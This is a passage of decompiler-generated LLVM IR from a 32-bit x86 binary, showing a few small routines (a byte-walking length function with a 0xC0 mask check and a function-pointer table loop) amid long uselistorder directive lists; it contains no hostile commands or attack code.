  uselistorder i32* @edi, { 3, 66, 67, 20, 68, 69, 70, 19, 71, 140, 141, 72, 73, 2, 0, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 22, 5, 4, 23, 24, 25, 26, 27, 28, 29, 30, 31, 89, 7, 90, 8, 91, 92, 6, 93, 94, 95, 96, 101, 102, 1, 97, 98, 99, 100, 200, 9, 201, 202, 203, 103, 104, 105, 106, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 32, 33, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 10, 215, 216, 217, 218, 219, 220, 221, 259, 260, 261, 11, 262, 263, 266, 267, 46, 47, 268, 269, 270, 271, 272, 273, 21, 274, 283, 284, 51, 12, 52, 53, 54, 34, 35, 36, 37, 38, 39, 40, 55, 56, 57, 58, 59, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 13, 195, 196, 197, 198, 199, 123, 124, 14, 125, 126, 127, 128, 129, 130, 131, 107, 108, 109, 110, 222, 223, 15, 224, 225, 226, 281, 282, 227, 228, 229, 16, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 132, 133, 134, 135, 152, 153, 154, 230, 231, 232, 233, 234, 235, 236, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 17, 251, 41, 42, 43, 237, 18, 238, 239, 277, 278, 279, 280, 155, 156, 157, 158, 159, 160, 48, 49, 50, 252, 253, 254, 255, 161, 162, 163, 164, 167, 168, 169, 264, 265, 60, 61, 275, 276, 165, 166, 44, 45, 62, 63, 64, 65, 136, 137, 138, 139, 170, 171, 256, 257, 258 }
  uselistorder i32 256, { 6, 7, 8, 9, 10, 11, 12, 50, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 49, 24, 25, 26, 27, 28, 0, 1, 29, 2, 51, 57, 52, 30, 31, 58, 32, 33, 5, 54, 55, 3, 34, 4, 35, 36, 53, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 56, 47, 48 }
  uselistorder i1 true, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder i32* @edx, { 2, 37, 38, 39, 40, 41, 42, 43, 44, 14, 48, 46, 47, 49, 50, 51, 52, 53, 54, 55, 16, 17, 18, 19, 20, 56, 57, 58, 59, 60, 61, 62, 69, 63, 64, 65, 66, 67, 68, 0, 15, 162, 163, 94, 164, 165, 166, 167, 168, 209, 73, 70, 71, 72, 74, 75, 76, 77, 78, 3, 21, 169, 170, 95, 96, 4, 97, 98, 99, 100, 171, 172, 173, 174, 175, 176, 211, 212, 213, 214, 5, 215, 216, 218, 110, 219, 111, 23, 24, 25, 22, 220, 221, 93, 112, 223, 224, 226, 225, 109, 26, 115, 116, 6, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 7, 130, 131, 113, 114, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 8, 157, 158, 159, 160, 161, 79, 80, 82, 83, 84, 32, 1, 9, 45, 81, 177, 85, 101, 102, 103, 104, 178, 179, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 13, 197, 198, 180, 199, 10, 200, 201, 203, 11, 204, 205, 206, 207, 208, 27, 12, 202, 222, 105, 106, 107, 217, 210, 227, 28, 29, 30, 31, 33, 34, 35, 36, 86, 87, 88, 89, 90, 91, 92, 108, 228 }
  uselistorder i32* @esi, { 83, 84, 85, 86, 87, 88, 34, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 35, 40, 41, 10, 5, 42, 43, 46, 44, 45, 6, 47, 48, 109, 11, 110, 111, 114, 112, 113, 121, 115, 116, 117, 118, 119, 120, 122, 123, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 12, 247, 248, 13, 124, 125, 131, 130, 7, 132, 133, 134, 135, 136, 137, 138, 139, 0, 36, 140, 141, 8, 142, 143, 144, 145, 49, 50, 51, 317, 318, 319, 320, 146, 147, 249, 250, 251, 14, 252, 253, 254, 255, 256, 257, 258, 64, 65, 321, 322, 323, 324, 39, 325, 326, 327, 335, 336, 337, 338, 69, 70, 71, 72, 73, 74, 75, 328, 333, 334, 52, 53, 54, 55, 56, 57, 76, 77, 78, 1, 79, 80, 81, 58, 59, 60, 61, 62, 208, 213, 15, 214, 215, 216, 217, 218, 219, 220, 209, 210, 211, 212, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 16, 232, 37, 233, 234, 235, 236, 148, 149, 150, 153, 154, 155, 156, 339, 17, 340, 341, 126, 127, 128, 129, 259, 18, 260, 38, 31, 151, 152, 157, 158, 348, 349, 261, 262, 263, 264, 265, 266, 267, 159, 160, 161, 162, 163, 164, 177, 19, 9, 178, 179, 180, 181, 182, 20, 32, 183, 184, 185, 186, 187, 165, 166, 167, 168, 169, 170, 188, 21, 189, 190, 268, 269, 270, 271, 23, 272, 2, 274, 275, 276, 277, 22, 278, 279, 273, 280, 281, 282, 283, 3, 284, 285, 286, 287, 288, 289, 290, 33, 24, 291, 292, 25, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 26, 310, 311, 312, 27, 63, 293, 4, 294, 295, 329, 330, 331, 332, 342, 343, 344, 345, 346, 347, 191, 192, 193, 194, 28, 195, 196, 197, 198, 66, 67, 68, 313, 314, 315, 316, 199, 200, 201, 202, 29, 30, 203, 204, 175, 176, 82, 171, 172, 173, 174, 205, 206, 207, 350 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8052181, { 1, 0 }
}

define i32 @function_805218c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805218c:
  %v1_805219a = icmp eq i32 %arg1, 0
  br i1 %v1_805219a, label %dec_label_pc_80521c9, label %dec_label_pc_80521ba.preheader

dec_label_pc_80521ba.preheader:                   ; preds = %dec_label_pc_805218c
  store i32 %arg2, i32* @ecx, align 4
  %v2_80521ba10 = add i32 %arg2, %arg1
  %v3_80521ba11 = inttoptr i32 %v2_80521ba10 to i8*
  %v4_80521ba12 = load i8, i8* %v3_80521ba11, align 1
  %v1_80521be14 = add i32 %arg2, 1
  %v1_80521c115 = icmp eq i8 %v4_80521ba12, 0
  %v1_80521c316 = icmp eq i1 %v1_80521c115, false
  br i1 %v1_80521c316, label %dec_label_pc_80521a9, label %dec_label_pc_80521c5

dec_label_pc_80521a0:                             ; preds = %dec_label_pc_80521a9
  %v1_80521a0 = add i32 %v0_80521a017, 2
  br label %dec_label_pc_80521c5

dec_label_pc_80521a9:                             ; preds = %dec_label_pc_80521ba.preheader, %dec_label_pc_80521ba
  %v1_80521be19 = phi i32 [ %v1_80521be, %dec_label_pc_80521ba ], [ %v1_80521be14, %dec_label_pc_80521ba.preheader ]
  %v5_80521ba18.in = phi i8 [ %v4_80521ba, %dec_label_pc_80521ba ], [ %v4_80521ba12, %dec_label_pc_80521ba.preheader ]
  %v0_80521a017 = phi i32 [ %v2_80521b7, %dec_label_pc_80521ba ], [ %arg2, %dec_label_pc_80521ba.preheader ]
  %v5_80521ba18 = zext i8 %v5_80521ba18.in to i32
  %v1_80521ab = and i32 %v5_80521ba18, 192
  %v6_80521b0 = icmp eq i32 %v1_80521ab, 192
  %v2_80521b7 = add i32 %v5_80521ba18, %v1_80521be19
  br i1 %v6_80521b0, label %dec_label_pc_80521a0, label %dec_label_pc_80521ba

dec_label_pc_80521ba:                             ; preds = %dec_label_pc_80521a9
  store i32 %v2_80521b7, i32* @ecx, align 4
  %v2_80521ba = add i32 %v2_80521b7, %arg1
  %v3_80521ba = inttoptr i32 %v2_80521ba to i8*
  %v4_80521ba = load i8, i8* %v3_80521ba, align 1
  %v1_80521be = add i32 %v2_80521b7, 1
  %v1_80521c1 = icmp eq i8 %v4_80521ba, 0
  %v1_80521c3 = icmp eq i1 %v1_80521c1, false
  br i1 %v1_80521c3, label %dec_label_pc_80521a9, label %dec_label_pc_80521c5

dec_label_pc_80521c5:                             ; preds = %dec_label_pc_80521ba.preheader, %dec_label_pc_80521ba, %dec_label_pc_80521a0
  %v0_80521c5 = phi i32 [ %v1_80521a0, %dec_label_pc_80521a0 ], [ %v1_80521be14, %dec_label_pc_80521ba.preheader ], [ %v1_80521be, %dec_label_pc_80521ba ]
  %v2_80521c7 = sub i32 %v0_80521c5, %arg2
  br label %dec_label_pc_80521c9

dec_label_pc_80521c9:                             ; preds = %dec_label_pc_805218c, %dec_label_pc_80521c5
  %v0_80521cc = phi i32 [ -1, %dec_label_pc_805218c ], [ %v2_80521c7, %dec_label_pc_80521c5 ]
  ret i32 %v0_80521cc

; uselistorder directives
  uselistorder i8 %v4_80521ba, { 1, 0 }
  uselistorder i32 %v2_80521b7, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 89, 29, 90, 51, 94, 95, 26, 27, 28, 0, 1, 91, 96, 97, 98, 81, 99, 100, 101, 102, 103, 104, 83, 2, 84, 85, 32, 105, 106, 3, 52, 33, 120, 121, 47, 107, 108, 109, 110, 82, 111, 112, 36, 122, 123, 48, 8, 9, 39, 40, 49, 130, 37, 80, 7, 53, 74, 54, 75, 55, 76, 34, 10, 86, 31, 56, 11, 12, 41, 13, 14, 119, 15, 16, 50, 17, 57, 113, 114, 115, 116, 4, 42, 87, 35, 92, 93, 18, 131, 43, 5, 6, 124, 125, 38, 19, 20, 126, 21, 127, 22, 44, 128, 129, 23, 118, 132, 58, 60, 59, 77, 62, 61, 63, 65, 64, 78, 45, 67, 46, 66, 79, 88, 24, 69, 25, 68, 30, 117, 71, 70, 72, 73 }
  uselistorder i8 0, { 28, 3, 6, 7, 29, 5, 4, 64, 65, 66, 9, 73, 68, 69, 8, 71, 72, 70, 22, 74, 0, 1, 42, 43, 44, 75, 76, 24, 77, 10, 12, 46, 45, 11, 30, 78, 79, 105, 126, 127, 15, 85, 81, 82, 80, 13, 83, 84, 14, 23, 86, 87, 88, 89, 90, 91, 92, 93, 94, 17, 48, 47, 16, 49, 50, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 2, 144, 145, 146, 182, 147, 185, 31, 39, 26, 27, 56, 18, 184, 117, 118, 119, 120, 121, 122, 123, 124, 32, 125, 58, 19, 67, 148, 149, 40, 150, 95, 96, 97, 106, 107, 108, 109, 110, 151, 152, 153, 154, 155, 156, 157, 158, 159, 20, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 21, 173, 174, 175, 176, 177, 178, 179, 180, 51, 183, 111, 112, 113, 181, 114, 115, 52, 53, 54, 55, 57, 59, 60, 61, 62, 63, 98, 99, 100, 101, 102, 103, 104, 116, 186, 187, 25, 41, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* @ecx, { 24, 5, 7, 23, 6, 46, 47, 12, 48, 49, 50, 51, 13, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 33, 34, 35, 36, 37, 38, 39, 40, 68, 69, 70, 8, 9, 41, 1, 138, 195, 11, 16, 71, 72, 14, 10, 15, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 2, 42, 139, 140, 29, 141, 86, 87, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 25, 167, 168, 169, 170, 26, 171, 22, 196, 197, 198, 199, 28, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 17, 115, 91, 92, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 18, 131, 132, 134, 135, 136, 137, 133, 83, 0, 172, 30, 31, 84, 88, 173, 174, 175, 176, 177, 178, 179, 27, 180, 181, 182, 183, 184, 185, 19, 20, 3, 4, 186, 187, 21, 188, 189, 190, 191, 192, 194, 43, 44, 193, 200, 89, 45, 201, 85, 32, 90 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521c9, { 1, 0 }
  uselistorder label %dec_label_pc_80521c5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80521a9, { 1, 0 }
}

define i32 @function_80521d0() local_unnamed_addr {
dec_label_pc_80521d0:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_80521dc = load i32, i32* @global_var_8055a08.173, align 8
  %v10_80521e1 = icmp eq i32 %v0_80521dc, -1
  br i1 %v10_80521e1, label %dec_label_pc_80521fc, label %dec_label_pc_80521f0.preheader

dec_label_pc_80521f0.preheader:                   ; preds = %dec_label_pc_80521d0
  br label %dec_label_pc_80521f0

dec_label_pc_80521f0:                             ; preds = %dec_label_pc_80521f0.preheader, %dec_label_pc_80521f0
  %v4_80521f3 = phi i32 [ %v0_80521dc, %dec_label_pc_80521f0.preheader ], [ %v2_80521f5, %dec_label_pc_80521f0 ]
  %v0_80521f0 = phi i32 [ ptrtoint (i32* @global_var_8055a08.173 to i32), %dec_label_pc_80521f0.preheader ], [ %v1_80521f0, %dec_label_pc_80521f0 ]
  %v1_80521f0 = add i32 %v0_80521f0, -4
  call void @__pseudo_call(i32 %v4_80521f3)
  %v1_80521f5 = inttoptr i32 %v1_80521f0 to i32*
  %v2_80521f5 = load i32, i32* %v1_80521f5, align 4
  %v10_80521f7 = icmp eq i32 %v2_80521f5, -1
  %v1_80521fa = icmp eq i1 %v10_80521f7, false
  br i1 %v1_80521fa, label %dec_label_pc_80521f0, label %dec_label_pc_80521fc.loopexit

dec_label_pc_80521fc.loopexit:                    ; preds = %dec_label_pc_80521f0
  %v2_80521fc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80521fc

dec_label_pc_80521fc:                             ; preds = %dec_label_pc_80521fc.loopexit, %dec_label_pc_80521d0
  %v2_80521fc = phi i32 [ %v2_80521fc.pre, %dec_label_pc_80521fc.loopexit ], [ %tmp6, %dec_label_pc_80521d0 ]
  ret i32 %v2_80521fc

; uselistorder directives
  uselistorder i32 %v0_80521dc, { 1, 0 }
  uselistorder i1 false, { 459, 166, 6, 2, 3, 8, 167, 168, 170, 169, 7, 172, 171, 173, 182, 26, 27, 177, 181, 179, 180, 36, 174, 175, 178, 183, 184, 185, 186, 187, 72, 74, 75, 76, 77, 73, 78, 79, 80, 33, 81, 34, 82, 188, 189, 194, 28, 190, 191, 193, 192, 195, 196, 201, 200, 197, 198, 199, 9, 0, 10, 83, 84, 85, 37, 202, 203, 204, 277, 278, 279, 346, 347, 348, 280, 29, 281, 349, 350, 351, 310, 127, 210, 30, 11, 205, 206, 207, 208, 209, 211, 212, 31, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 228, 227, 12, 86, 87, 88, 89, 352, 353, 354, 229, 230, 282, 283, 284, 355, 356, 357, 358, 359, 360, 361, 47, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 460, 461, 35, 1, 388, 38, 50, 389, 390, 311, 312, 313, 91, 118, 475, 476, 477, 478, 481, 39, 482, 483, 480, 474, 462, 90, 128, 129, 130, 131, 132, 133, 463, 464, 51, 143, 144, 145, 146, 147, 148, 13, 134, 14, 306, 307, 92, 467, 468, 469, 470, 471, 472, 473, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 314, 327, 328, 329, 330, 331, 332, 333, 334, 335, 24, 337, 336, 341, 338, 339, 340, 15, 342, 343, 231, 232, 234, 235, 154, 4, 5, 157, 156, 155, 16, 479, 176, 391, 392, 40, 393, 17, 233, 236, 394, 237, 238, 239, 240, 241, 242, 243, 287, 285, 286, 18, 32, 288, 290, 289, 41, 291, 293, 292, 42, 294, 244, 245, 295, 119, 48, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 415, 414, 416, 417, 418, 419, 420, 422, 25, 423, 421, 424, 426, 425, 19, 427, 428, 430, 429, 43, 431, 432, 433, 434, 435, 52, 436, 437, 63, 64, 438, 65, 66, 439, 440, 67, 441, 442, 53, 68, 443, 444, 445, 446, 447, 54, 448, 55, 69, 56, 449, 57, 450, 451, 452, 58, 453, 59, 454, 70, 455, 456, 457, 93, 94, 465, 44, 466, 20, 296, 297, 298, 299, 300, 301, 120, 45, 121, 122, 123, 124, 125, 126, 302, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 135, 136, 137, 138, 139, 140, 141, 142, 149, 150, 151, 152, 153, 158, 159, 160, 161, 162, 163, 164, 165, 246, 247, 248, 60, 22, 249, 250, 251, 252, 253, 254, 61, 21, 255, 256, 257, 62, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 23, 269, 270, 271, 272, 273, 49, 274, 275, 276, 303, 304, 305, 308, 309, 344, 345, 458, 484, 71, 46, 485 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 48, 17, 30, 31, 32, 33, 36, 37, 38, 39, 2, 40, 0, 35, 41, 42, 43, 44, 45, 46, 3, 34, 49, 50, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 4, 47 }
  uselistorder i32 ptrtoint (i32* @global_var_8055a08.173 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 0, 1, 59, 50, 153, 167, 39, 279, 60, 168, 61, 169, 280, 62, 63, 170, 64, 2, 3, 152, 277, 171, 4, 5, 6, 67, 66, 65, 172, 119, 120, 44, 43, 42, 173, 174, 68, 175, 31, 281, 176, 282, 283, 177, 178, 284, 154, 69, 179, 302, 180, 181, 182, 70, 183, 7, 184, 185, 186, 187, 188, 285, 286, 9, 10, 287, 288, 140, 189, 141, 142, 132, 134, 135, 136, 137, 138, 139, 133, 32, 131, 121, 128, 190, 129, 130, 143, 127, 144, 145, 146, 147, 148, 149, 150, 122, 126, 8, 192, 191, 57, 33, 193, 194, 289, 290, 48, 40, 71, 195, 53, 196, 303, 197, 123, 72, 73, 198, 74, 199, 155, 200, 201, 54, 202, 151, 203, 49, 204, 205, 206, 76, 75, 207, 208, 11, 51, 209, 77, 78, 79, 210, 55, 56, 211, 80, 81, 212, 82, 213, 83, 214, 84, 215, 85, 216, 86, 217, 87, 218, 88, 219, 89, 220, 90, 221, 91, 222, 92, 223, 93, 224, 94, 225, 95, 226, 96, 227, 12, 228, 58, 97, 98, 229, 230, 231, 232, 233, 234, 100, 99, 101, 235, 102, 236, 45, 237, 103, 238, 239, 308, 240, 241, 13, 299, 300, 16, 15, 17, 18, 19, 104, 20, 105, 21, 242, 14, 301, 34, 291, 294, 106, 243, 107, 304, 244, 245, 292, 293, 246, 295, 296, 309, 108, 156, 247, 248, 46, 249, 250, 251, 52, 252, 37, 305, 306, 38, 253, 254, 307, 255, 109, 256, 257, 258, 165, 166, 259, 157, 35, 124, 125, 110, 158, 297, 298, 111, 260, 112, 261, 113, 262, 114, 263, 115, 264, 116, 265, 117, 266, 118, 267, 22, 278, 160, 159, 268, 23, 24, 25, 161, 162, 163, 26, 269, 27, 270, 271, 36, 47, 272, 28, 29, 30, 41, 273, 274, 275, 276, 164 }
  uselistorder i32 1, { 378, 694, 235, 639, 695, 230, 696, 80, 697, 246, 698, 699, 33, 700, 379, 150, 381, 380, 84, 247, 248, 701, 236, 231, 704, 340, 705, 706, 707, 302, 708, 0, 368, 122, 121, 709, 710, 383, 382, 190, 189, 191, 711, 384, 712, 385, 182, 713, 714, 386, 174, 173, 175, 646, 647, 648, 649, 650, 651, 652, 653, 654, 391, 390, 389, 388, 387, 113, 112, 111, 114, 655, 656, 395, 394, 393, 392, 109, 105, 107, 104, 106, 108, 276, 715, 716, 226, 717, 718, 249, 719, 303, 720, 721, 396, 205, 277, 725, 722, 723, 724, 237, 399, 398, 397, 144, 143, 657, 658, 659, 250, 660, 726, 727, 728, 400, 177, 176, 178, 179, 304, 729, 130, 785, 401, 110, 251, 252, 52, 54, 53, 55, 253, 402, 56, 278, 1, 404, 403, 118, 119, 405, 217, 406, 83, 279, 280, 407, 281, 282, 408, 307, 409, 227, 730, 731, 232, 732, 254, 238, 733, 735, 736, 737, 738, 739, 740, 255, 412, 411, 410, 741, 742, 743, 744, 745, 746, 747, 748, 2, 749, 256, 750, 751, 752, 257, 753, 754, 258, 755, 756, 757, 758, 759, 308, 415, 414, 413, 61, 60, 62, 283, 284, 760, 761, 762, 763, 239, 661, 662, 663, 135, 416, 841, 417, 73, 74, 285, 786, 369, 192, 310, 842, 843, 844, 259, 309, 418, 845, 846, 847, 260, 848, 849, 430, 429, 428, 427, 426, 425, 424, 423, 422, 421, 420, 419, 200, 203, 195, 196, 198, 197, 194, 202, 199, 201, 850, 851, 3, 71, 70, 69, 68, 67, 431, 221, 222, 432, 65, 64, 852, 853, 433, 102, 101, 103, 886, 887, 888, 434, 47, 46, 48, 45, 435, 854, 436, 28, 25, 27, 23, 24, 26, 286, 287, 439, 438, 437, 440, 18, 441, 146, 442, 443, 172, 63, 444, 162, 446, 445, 131, 447, 180, 448, 115, 449, 183, 450, 181, 451, 188, 452, 453, 85, 454, 141, 456, 455, 72, 457, 66, 458, 137, 96, 460, 459, 138, 461, 465, 464, 463, 462, 100, 891, 892, 893, 468, 467, 466, 29, 31, 30, 894, 288, 470, 469, 472, 471, 218, 289, 347, 635, 4, 478, 477, 476, 475, 474, 473, 148, 149, 889, 481, 480, 479, 99, 97, 98, 311, 482, 682, 683, 684, 685, 483, 36, 35, 37, 38, 34, 39, 290, 484, 40, 41, 676, 640, 233, 677, 348, 678, 370, 485, 77, 76, 75, 78, 486, 93, 91, 89, 90, 95, 94, 92, 210, 207, 209, 211, 206, 208, 312, 488, 487, 313, 489, 314, 490, 315, 493, 492, 491, 349, 496, 495, 494, 193, 316, 808, 809, 810, 497, 136, 811, 812, 240, 813, 814, 815, 214, 212, 213, 350, 807, 261, 184, 185, 187, 186, 317, 816, 817, 818, 819, 820, 821, 822, 823, 824, 262, 825, 826, 827, 828, 829, 293, 830, 831, 225, 294, 832, 833, 834, 835, 291, 292, 836, 837, 838, 500, 499, 498, 165, 164, 163, 167, 166, 351, 501, 502, 503, 504, 505, 506, 507, 508, 764, 5, 765, 318, 245, 319, 769, 6, 513, 512, 511, 510, 509, 139, 140, 514, 515, 687, 688, 689, 241, 295, 690, 518, 517, 516, 120, 519, 734, 520, 133, 702, 703, 855, 856, 376, 521, 134, 857, 766, 767, 768, 523, 522, 44, 43, 42, 770, 771, 524, 59, 58, 57, 896, 525, 87, 86, 88, 526, 527, 296, 772, 773, 774, 371, 22, 21, 787, 788, 789, 263, 19, 320, 321, 322, 790, 528, 323, 324, 791, 264, 7, 530, 529, 204, 325, 775, 776, 531, 51, 49, 50, 326, 532, 147, 297, 533, 17, 16, 858, 859, 636, 266, 860, 861, 862, 863, 864, 866, 867, 868, 267, 869, 870, 352, 265, 871, 268, 872, 873, 874, 865, 537, 536, 535, 534, 154, 156, 155, 151, 152, 153, 157, 875, 538, 171, 168, 170, 169, 269, 539, 876, 877, 541, 540, 158, 159, 878, 879, 641, 642, 298, 880, 299, 881, 882, 883, 270, 884, 327, 885, 544, 543, 542, 123, 127, 124, 125, 126, 271, 328, 8, 329, 545, 546, 82, 81, 890, 548, 547, 215, 216, 300, 895, 549, 220, 330, 224, 331, 792, 793, 794, 795, 796, 797, 798, 799, 800, 553, 552, 551, 550, 32, 332, 272, 333, 334, 305, 342, 557, 556, 555, 554, 20, 335, 560, 559, 558, 563, 562, 561, 145, 564, 336, 801, 802, 337, 338, 803, 566, 565, 568, 567, 129, 569, 79, 570, 116, 572, 571, 132, 573, 142, 574, 223, 575, 219, 576, 128, 353, 577, 354, 355, 356, 357, 301, 578, 583, 582, 581, 580, 579, 664, 665, 584, 666, 234, 667, 668, 669, 670, 671, 672, 673, 674, 675, 372, 585, 586, 679, 358, 359, 367, 377, 373, 592, 591, 590, 589, 588, 587, 680, 681, 360, 593, 361, 594, 637, 603, 602, 601, 374, 600, 599, 598, 597, 596, 595, 686, 339, 362, 604, 638, 363, 605, 611, 610, 609, 608, 607, 606, 612, 691, 228, 229, 692, 693, 9, 614, 613, 117, 10, 11, 12, 615, 13, 777, 778, 273, 243, 779, 780, 781, 643, 274, 242, 782, 783, 644, 364, 620, 619, 618, 617, 616, 160, 161, 306, 621, 275, 784, 645, 365, 366, 627, 626, 625, 624, 623, 622, 804, 805, 806, 628, 375, 244, 14, 341, 839, 15, 840, 630, 629, 343, 897, 898, 344, 899, 900, 345, 346, 901, 902, 631, 633, 632, 634 }
  uselistorder label %dec_label_pc_80521f0, { 1, 0 }
}

define i32 @function_8052204() local_unnamed_addr {
entry:
  %v0_8052207 = load i32, i32* @ebx, align 4
  %v1_8052208 = call i32 @function_80480b0(i32 %v0_8052207)
  store i32 %v1_8052208, i32* @eax, align 4
  %v0_8052213 = call i32 @function_80480c0()
  ret i32 %v0_8052213

; uselistorder directives
  uselistorder i32* @eax, { 45, 34, 109, 2, 110, 111, 1, 112, 0, 33, 108, 113, 35, 114, 68, 69, 70, 11, 71, 115, 120, 116, 117, 118, 119, 3, 4, 183, 184, 173, 194, 121, 38, 36, 122, 37, 123, 124, 125, 126, 39, 40, 127, 128, 41, 129, 62, 130, 63, 64, 65, 131, 132, 133, 134, 42, 135, 136, 137, 138, 43, 146, 14, 196, 197, 66, 198, 199, 201, 67, 202, 5, 200, 8, 10, 195, 85, 12, 72, 73, 170, 74, 174, 176, 177, 175, 178, 179, 181, 182, 180, 139, 44, 100, 101, 102, 103, 104, 6, 147, 148, 149, 54, 150, 151, 152, 153, 154, 140, 141, 155, 156, 77, 78, 185, 187, 186, 188, 189, 191, 75, 190, 157, 158, 55, 159, 160, 79, 80, 81, 15, 16, 82, 17, 83, 84, 161, 56, 57, 162, 163, 164, 165, 58, 166, 76, 13, 18, 19, 86, 87, 88, 89, 20, 90, 21, 22, 23, 91, 24, 92, 93, 94, 25, 95, 26, 27, 28, 96, 29, 97, 98, 99, 30, 31, 32, 105, 106, 107, 61, 142, 143, 46, 47, 144, 145, 48, 49, 50, 51, 52, 53, 167, 59, 168, 60, 169, 171, 172, 203, 192, 193, 7, 9 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 589, 14, 15, 16, 94, 47, 400, 590, 593, 591, 592, 401, 41, 718, 787, 788, 242, 604, 596, 598, 599, 20, 38, 600, 601, 602, 402, 603, 102, 103, 104, 594, 595, 110, 605, 606, 608, 609, 607, 610, 208, 611, 612, 613, 614, 615, 616, 112, 113, 403, 257, 258, 486, 404, 487, 111, 488, 489, 490, 491, 492, 493, 50, 51, 494, 495, 496, 394, 497, 49, 405, 48, 406, 114, 115, 407, 17, 408, 498, 18, 409, 116, 259, 410, 411, 117, 412, 619, 413, 617, 197, 618, 260, 261, 118, 119, 39, 414, 620, 621, 622, 623, 624, 262, 415, 416, 21, 52, 500, 89, 90, 417, 625, 53, 418, 22, 419, 789, 263, 719, 720, 721, 790, 791, 13, 209, 121, 120, 792, 793, 210, 794, 420, 722, 723, 421, 795, 422, 796, 797, 798, 799, 626, 755, 122, 423, 0, 499, 1, 1005, 539, 540, 123, 264, 632, 627, 628, 629, 631, 97, 23, 633, 634, 635, 636, 637, 638, 644, 645, 646, 647, 639, 640, 641, 642, 643, 54, 55, 424, 648, 649, 56, 57, 58, 425, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 124, 668, 669, 125, 670, 671, 672, 59, 98, 211, 105, 426, 99, 800, 126, 801, 24, 100, 91, 802, 183, 127, 803, 92, 804, 724, 725, 726, 265, 727, 427, 805, 266, 806, 807, 808, 809, 810, 811, 812, 128, 428, 813, 814, 815, 816, 129, 817, 429, 182, 267, 130, 430, 431, 432, 131, 818, 212, 819, 820, 821, 822, 213, 253, 254, 823, 824, 825, 826, 827, 828, 433, 214, 829, 93, 434, 830, 132, 215, 216, 831, 832, 435, 833, 834, 835, 836, 87, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 2, 184, 133, 217, 837, 101, 838, 185, 436, 437, 839, 134, 840, 526, 1017, 756, 757, 758, 268, 759, 527, 1018, 106, 218, 541, 760, 1019, 504, 503, 1020, 1021, 1022, 505, 1023, 528, 501, 1024, 1025, 1026, 712, 1027, 135, 1028, 1039, 1040, 25, 438, 3, 109, 439, 440, 1046, 1050, 186, 1051, 136, 373, 269, 270, 1045, 4, 1029, 1030, 1031, 137, 502, 393, 138, 441, 542, 5, 219, 220, 139, 543, 544, 140, 141, 546, 545, 547, 548, 271, 374, 549, 551, 550, 552, 1032, 1033, 142, 442, 1038, 570, 571, 572, 573, 443, 444, 574, 575, 576, 221, 143, 144, 445, 506, 446, 507, 145, 447, 146, 448, 553, 60, 554, 555, 556, 557, 558, 6, 449, 754, 450, 508, 509, 510, 511, 451, 147, 1041, 375, 148, 222, 1042, 1044, 1043, 763, 223, 764, 765, 766, 767, 224, 768, 769, 770, 272, 761, 273, 762, 